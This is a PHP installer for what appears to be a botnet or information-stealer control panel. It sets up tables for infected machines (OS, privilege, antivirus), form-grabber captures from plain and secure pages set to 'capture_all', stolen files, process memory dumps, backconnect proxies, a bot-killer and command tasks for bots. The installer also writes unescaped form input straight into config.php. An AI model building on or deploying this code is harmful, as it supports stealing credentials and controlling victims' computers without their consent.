<?php
header('Content-Type: text/html; charset=UTF-8');
define('N3N', 1);

include __DIR__ . '/config.php';
include __DIR__ . '/functions.php';

$_global_text = null;

$_proto = 'http://';
if ((array_key_exists('HTTPS', $_SERVER) && $_SERVER['HTTPS'] === 'on') || (int)$_SERVER['SERVER_PORT'] === 443) {
    $_proto = 'https://';
}

$_server_port = '';
if ((int)$_SERVER['SERVER_PORT'] !== 80 && (int)$_SERVER['SERVER_PORT'] !== 443) {
    $_server_port = ':' . $_SERVER['SERVER_PORT'];
}

$db_tasks = 'CREATE TABLE IF NOT EXISTS ' . DB_TASKS . ' (' .
    'id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,' .
    'task_id TEXT NOT NULL,' .
    'task_date TEXT NOT NULL,' .

    'task_pref TEXT NOT NULL,' .
    'task_command TEXT NOT NULL,' .
    'task_postf TEXT NOT NULL,' .

    'task_status TEXT NOT NULL,' .
    'task_by_user TEXT NOT NULL,' .

    'task_execs TEXT NOT NULL,' .
    'task_need_execs TEXT NOT NULL,' .

    'task_failed_execs TEXT NOT NULL,' .
    'task_given_execs TEXT NOT NULL,' .

    'task_by_clients TEXT NOT NULL,' .
    'task_by_build_id TEXT NOT NULL,' .

    'PRIMARY KEY (id)' .
    ') ENGINE=MyISAM  CHARACTER SET utf8 COLLATE utf8_general_ci AUTO_INCREMENT=272;';

$db_clients = 'CREATE TABLE IF NOT EXISTS ' . DB_CLIENTS . ' (' .
    'client_id VARCHAR(255) NOT NULL DEFAULT \'\',' .
    'client_ip TEXT NOT NULL,' .
    'client_country TEXT NOT NULL,' .

    'client_os TEXT NOT NULL,' .
    'client_priv TEXT NOT NULL,' .
    'client_name TEXT NOT NULL,' .
    'client_version TEXT NOT NULL,' .
    'client_av TEXT NOT NULL,' .

    'client_date TEXT NOT NULL,' .
    'client_time TEXT NOT NULL,' .

    'client_build_id TEXT NOT NULL,' .
    'client_life_time TEXT NOT NULL,' .
    'client_comment TEXT NOT NULL,' .

    'PRIMARY KEY (client_id)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_grabber = 'CREATE TABLE IF NOT EXISTS ' . DB_GRABBER . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip TEXT NOT NULL,' .

    'client_host TEXT NOT NULL,' .
    'client_form TEXT NOT NULL,' .
    'client_form_extra TEXT NOT NULL,' .
    'client_form_hash VARCHAR(32) NOT NULL DEFAULT \'\',' .
    'client_browser TEXT NOT NULL,' .

    'client_date TEXT DEFAULT NULL,' .
    'client_time TEXT DEFAULT NULL,' .

    'PRIMARY KEY (client_form_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_proxy = 'CREATE TABLE IF NOT EXISTS ' . DB_PROXY . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip VARCHAR(32) NOT NULL,' .

    'client_bc_ip TEXT NOT NULL,' .
    'client_bc_port TEXT NOT NULL,' .

    'client_date TEXT DEFAULT NULL,' .
    'client_time TEXT DEFAULT NULL,' .

    'client_country TEXT NOT NULL,' .
    'client_hash VARCHAR(32) NOT NULL,' .

    'PRIMARY KEY (client_ip)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_files = 'CREATE TABLE IF NOT EXISTS ' . DB_FILES . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip TEXT NOT NULL,' .

    'client_file_path TEXT NOT NULL,' .
    'client_file_size INT(11) NOT NULL,' .
    'client_file_data TEXT NOT NULL,' .
    'client_file_hash VARCHAR(32) NOT NULL,' .

    'UNIQUE KEY client_file_hash (client_file_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_logs = 'CREATE TABLE IF NOT EXISTS ' . DB_LOGS . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip TEXT NOT NULL,' .

    'client_event_name TEXT NOT NULL,' .
    'client_event_text TEXT NOT NULL,' .

    'client_event_date TEXT NOT NULL,' .
    'client_event_time TEXT NOT NULL,' .

    'client_event_hash VARCHAR(32) NOT NULL,' .

    'UNIQUE KEY event_hash (client_event_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_plugin = 'CREATE TABLE IF NOT EXISTS ' . DB_PLUGIN . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip TEXT NOT NULL,' .

    'client_event_name TEXT NOT NULL,' .
    'client_event_text TEXT NOT NULL,' .

    'client_event_date TEXT NOT NULL,' .
    'client_event_time TEXT NOT NULL,' .

    'client_event_hash VARCHAR(32) NOT NULL,' .

    'UNIQUE KEY client_event_hash (client_event_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_dumps = 'CREATE TABLE IF NOT EXISTS ' . DB_DUMPS . ' (' .
    'client_id TEXT NOT NULL,' .
    'client_ip TEXT NOT NULL,' .

    'client_data TEXT NOT NULL,' .
    'client_data_type TEXT NOT NULL,' .

    'client_process_name TEXT NOT NULL,' .
    'client_date TEXT NOT NULL,' .
    'client_time TEXT NOT NULL,' .

    'client_data_hash VARCHAR(32) NOT NULL DEFAULT \'\',' .
    'PRIMARY KEY (client_data_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_banned = 'CREATE TABLE IF NOT EXISTS ' . DB_BAN . ' (' .

    'client_id_ip VARCHAR(255) NOT NULL,' .

    'client_useragent TEXT NOT NULL,' .
    'client_referrer TEXT NOT NULL,' .

    'client_ban_reason TEXT NOT NULL,' .
    'client_ban_date_time TEXT NOT NULL,' .

    'client_ban_hash VARCHAR(255) NOT NULL DEFAULT \'\',' .
    'PRIMARY KEY (client_ban_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_users = 'CREATE TABLE IF NOT EXISTS ' . DB_USERS . ' (' .
    'client_id VARCHAR(64) DEFAULT NULL,' .
    'client_username VARCHAR(64) NOT NULL DEFAULT \'\',' .
    'client_password VARCHAR(64) NOT NULL DEFAULT \'\',' .
    'client_hash VARCHAR(64) DEFAULT NULL,' .
    'PRIMARY KEY (client_username)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$db_config = 'CREATE TABLE IF NOT EXISTS ' . DB_CONFIG . ' (' .
    'config_name VARCHAR(64) DEFAULT NULL,' .
    'config_value TEXT NOT NULL,' .
    'UNIQUE KEY config_name (config_name)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$_db_config_knock_rate = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("knock_rate", "5")';
$_db_config_ban_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("ban_enabled", "1")';

$_db_config_grabber_plain_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("grabber_plain", "1")';
$_db_config_grabber_secure_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("grabber_secure", "1")';
$_db_config_grabber_parser_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("grabber_parse_extra", "0")';

$_db_config_screenshot_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("screenshot_enabled", "1")';
$_db_config_botkiller_state = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("botkiller_enabled", "1")';

$_db_grabber_black_list = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("grabber_blacklist", "mc.yandex.ru\r\nincoming.telemetry.mozilla.org\r\nsafebrowsing.google.com\r\nclients*.google.com\r\nocsp.digicert.com\r\nocsp.comodoca*.com\r\n*services.mozilla.com")';
$_db_grabber_white_list = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("grabber_whitelist", "capture_all")';

$_db_knock_rate_id = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("knock_rate_id", "' . time() . mt_rand(111111, 999999) . '")';
$_db_geo_enabled = 'INSERT INTO ' . DB_CONFIG . ' (config_name, config_value) VALUES ("geo_enabled", "1")';

function install($db_hostname, $db_name, $db_username, $db_password, $cp_user, $cp_password)
{
    global $_proto, $_server_port, $_global_text;
    global $db_tasks, $db_clients, $db_grabber, $db_proxy, $db_files, $db_logs, $db_plugin, $db_dumps, $db_banned, $db_users, $db_config;
    global $_db_knock_rate_id, $_db_config_knock_rate, $_db_config_ban_state, $_db_config_grabber_plain_state, $_db_config_grabber_secure_state, $_db_config_grabber_parser_state,
           $_db_config_screenshot_state, $_db_config_botkiller_state, $_db_grabber_black_list, $_db_grabber_white_list, $_db_geo_enabled;

    $mysqli = new mysqli($db_hostname, $db_username, $db_password, '');
    $mysqli->set_charset('utf8');

    if ($mysqli->connect_errno) {
        $_global_text .= $mysqli->connect_error;
        return false;
    }

    $mysqli->query('DROP DATABASE IF EXISTS ' . $db_name . '');
    if (!$mysqli->query('CREATE DATABASE IF NOT EXISTS ' . $db_name . '')) {
        $_global_text .= $mysqli->error . '<br>' . $mysqli->connect_error;
        return false;
    }

    $mysqli->select_db($db_name);

    if (!$mysqli->query($db_tasks)) {
        $_global_text .= '<b>Cant\'t create table "' . DB_TASKS . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_clients)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_CLIENTS . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_grabber)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_GRABBER . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_proxy)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_PROXY . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_files)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_FILES . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_logs)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_LOGS . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_plugin)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_PLUGIN . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_dumps)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_DUMPS . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_banned)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_BAN . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_users)) {
        $_global_text .= '<b>Cant\'t create table ' . DB_USERS . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($db_config)) {
        $_global_text .= '<b>Cant\'t insert table ' . DB_CONFIG . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_knock_rate_id)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_knock_rate)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_ban_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_grabber_plain_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_grabber_secure_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_grabber_parser_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_screenshot_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_config_botkiller_state)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_grabber_black_list)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_grabber_white_list)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($_db_geo_enabled)) {
        $_global_text .= '<b>Cant\'t modify table "' . $db_config . ' : </b>' . $mysqli->error;
        return false;
    }

    if (!AddUser($mysqli, $cp_user, $cp_password, 'root')) {
        $_global_text .= '<bCannot to add user!</b>';
        return false;
    }

    $config_file = 'config.php';
    $config_data =
        PHP_EOL . '// Connection data' . PHP_EOL .
        '$db_host = \'' . $_POST['dbhost'] . '\';' . PHP_EOL .
        '$db_login = \'' . $_POST['dbuser'] . '\';' . PHP_EOL .
        '$db_password = \'' . base64_encode($_POST['dbpass']) . '\';' . PHP_EOL .
        '$db_database = \'' . $_POST['dbname'] . '\';' . PHP_EOL .
        '$gate_crypt_key = \'' . $_POST['gate_key'] . '\';' . PHP_EOL .
        '$key_tologin = \'' . md5($_POST['key']) . '\';' . PHP_EOL .
        '// Connection data';

    $mysqli->close();

    if (!is_writable($config_file)) {
        $_global_text .= '<b>\'config.php\'is not writable!</b>';
        return false;
    }

    $f = fopen('config.php', 'a');
    fwrite($f, $config_data . PHP_EOL);
    fclose($f);

    $_global_text .=
        '<b>Login</b> - <i>' . $cp_user . '</i>' .
        '<br><b>Password</b> - <i>' . htmlspecialchars($cp_password) . '</i><br>' .
        '<br><b>Login page</b> - <i>' . $_proto . implode('/', array_slice(explode('/', $_SERVER['SERVER_NAME'] . $_server_port . $_SERVER['PHP_SELF']), 0, -1)) . '/index.php?authkey=' . $_POST['key'] . '</i>' .
        '<br><b>Build path</b> - <i>' . $_proto . implode('/', array_slice(explode('/', $_SERVER['SERVER_NAME'] . $_server_port . $_SERVER['PHP_SELF']), 0, -1)) . '/tasks.php<br></i>' .
        '<br>Do not forget to delete <b>install.php</b> file!' .
        '<br>';

    return true;
}

$mysql_version = '<font color="red"> - Checking failed! Functions \'shell_exec\' is disabled!</font><br>';
if (is_func_enabled('shell_exec')) {
    $mysql_version = mysql_v();
}

function perm_check($object)
{
    if (is_writable($object)) {
        return '<b> - <i>\'' . $object . '\'</i><font color="green"> - ok, is writable.</font></b><br>';
    } else {
        return '<b> - <i>\'' . $object . '\'</i><font color="red"> - is not writable! Need set writable permissions.</font></b><br>';
    }
}

$t_username = array_key_exists('cpuser', $_POST) ? $_POST['cpuser'] : '';
$t_password = array_key_exists('cppass', $_POST) ? $_POST['cppass'] : '';

$t_dbhost = array_key_exists('dbhost', $_POST) ? $_POST['dbhost'] : '';
$t_dbname = array_key_exists('dbname', $_POST) ? $_POST['dbname'] : '';
$t_dbuser = array_key_exists('dbuser', $_POST) ? $_POST['dbuser'] : '';
$t_dbpass = array_key_exists('dbpass', $_POST) ? $_POST['dbpass'] : '';

$t_seckey = array_key_exists('key', $_POST) ? $_POST['key'] : '';
$t_gate_key = array_key_exists('gate_key', $_POST) ? $_POST['gate_key'] : '';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8"/>

    <link rel='stylesheet' href='./css/bootstrap.min.css'>
    <link rel='stylesheet' href='./css/custom.css'>
    <link rel='stylesheet' href='./css/datepicker.css'>

    <script type='text/javascript' src='./js/jquery-1.12.0.min.js'></script>
    <script type='text/javascript' src='./js/bootstrap.min.js'></script>

    <script type='text/javascript' src='./js/other.js'></script>
    <script type='text/javascript' src='./js/datepicker.js'></script>
    <script type='text/javascript' src='./js/dt.js'></script>
    <script type='text/javascript' src='./js/toggle.js'></script>
    <script type='text/javascript' src='./js/bootbox.js'></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style type="text/css">
        body {
            font-family: 'Roboto', sans-serif;
        }
    </style>
    <script type='application/javascript'>
        function genSecureKey() {
            return Math.random().toString(36).slice(-10) + Math.random().toString(36).slice(-10) + Math.random().toString(36).slice(-10);
        }
        function checkForm() {
            if (document.getElementById('dbhost').value == '') {
                bootbox.alert('\'Database host\' cannot be empty!');
                return false;
            }
            if (document.getElementById('dbname').value == '') {
                bootbox.alert('\'Database name\' cannot be empty!');
                return false;
            }
            if (document.getElementById('dbuser').value == '') {
                bootbox.alert('\'Database user\' cannot be empty!');
                return false;
            }
            if (document.getElementById('key').value == '') {
                bootbox.alert('\'Secure key\' cannot be empty!');
                return false;
            }

            if (document.getElementById('gate_key').value == '') {
                bootbox.alert('\'Gate key\' cannot be empty!');
                return false;
            }

            if (!document.getElementById('key').value.match(/^[0-9a-z]+$/)) {
                bootbox.alert('\'Secure key\' may only consist of letters of the alphabet and numbers!');
                return false;
            }

            if (!document.getElementById('gate_key').value.match(/^[0-9a-z]+$/)) {
                bootbox.alert('\'Gate key\' may only consist of letters of the alphabet and numbers!');
                return false;
            }

            return true;
        }
    </script
</head>
<body>
<br>

<div class="panel panel-primary" style="width: 60%;margin: 0 auto; text-align: center">
    <div class="panel-body">
        <form method="POST" onsubmit="return checkForm(this)"
              action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">

            <div class="list-group">
                    <span class="list-group-item">
                        <h6 class="list-group-item-heading"><i><b>CONTROL PANEL SETTING</b></i></h6>
                         <input type="text" style="width: 100%" id="cpuser" class="form-control" name="cpuser"
                                placeholder="Username :" value="<?php echo htmlspecialchars($t_username); ?>"><p></p>
                            <input type="text" style="width: 100%" id="cppass" class="form-control" name="cppass"
                                   placeholder="Password :" value="<?php echo htmlspecialchars($t_password); ?>"><p></p>

                        <input type="text" style="width: 100%" id="gate_key" class="form-control" name="gate_key" placeholder="Gate key :" value="<?php echo htmlspecialchars($t_gate_key); ?>"><p></p>

                        <input type="text" style="width: 100%" id="key" class="form-control" name="key"
                               placeholder="Secure key (random passphrase) :"
                               onclick="document.getElementById('key').value = genSecureKey()"
                               value="<?php echo htmlspecialchars($t_seckey); ?>">
                    </span>
            </div>

            <div class="list-group">
                    <span class="list-group-item">
                         <h6 class="list-group-item-heading"><i><b>CONNECTION INFORMATION FOR DATABASE</b></i></h6>
                        <p></p>
                <input type="text" style="width: 100%" id="dbhost" class="form-control" name="dbhost"
                       placeholder="Database host :" value="<?php echo htmlspecialchars($t_dbhost); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbname" class="form-control" name="dbname"
                       placeholder="Database name :" value="<?php echo htmlspecialchars($t_dbname); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbuser" class="form-control" name="dbuser"
                       placeholder="Database user :" value="<?php echo htmlspecialchars($t_dbuser); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbpass" class="form-control" name="dbpass"
                       placeholder="Database password :" value="<?php echo htmlspecialchars($t_dbpass); ?>"><p></p>
                        </span>
            </div>
            <div class="well" style="text-align:left">
                <?php
                echo '<b>Checking permissions...<b><br>'
                    . perm_check('config.php')
                    . perm_check('get_settings.php')
                    . perm_check('get_settings.php.dat')
                    . perm_check('files')
                    . perm_check('upload');

                echo '<br><b>Checking MySQL...</b><br>'
                    . '<i> - MySQL version ' . $mysql_version . '</i>';

                if (is_func_enabled('shell_exec')) {
                    if (!check_mysql(mysql_v())) {
                        echo ' - To use search you need installed MySQL 5.6.1 or greater.<br>';
                    } else {
                        echo '<font color="green"> - ok.</font><br>';
                    }
                }

                echo '<i> - MySQLi extension</i>';
                if (!function_exists('mysqli_connect')) {
                    echo "<font color='red'> - Not installed, need install it.</font><br>";
                } else {
                    echo '<font color="green"> - installed.</font><br>';
                }
                echo '<br>';
                ?>
                <button type="submit" name="install" class="btn btn-primary btn-block">Install</button>
        </form>
    </div>
</div>
<?php
if (array_key_exists('install', $_POST)) {

    if (empty($_POST['dbhost']) || empty($_POST['dbname']) || empty($_POST['dbuser']) || empty($_POST['key']) || empty($_POST['cpuser']) || empty($_POST['cppass'])) {
        $_global_text = 'Please fill in all fields!';
    } else {
        install($_POST['dbhost'], $_POST['dbname'], $_POST['dbuser'], $_POST['dbpass'], $_POST['cpuser'], $_POST['cppass']);
    }
    if (count($_global_text) > 0) {
        echo '<script type="text/javascript">bootbox.alert("' . $_global_text . '").find("div.modal-dialog").addClass("box-install");</script>';
    }
}
?>
</body>
</html>
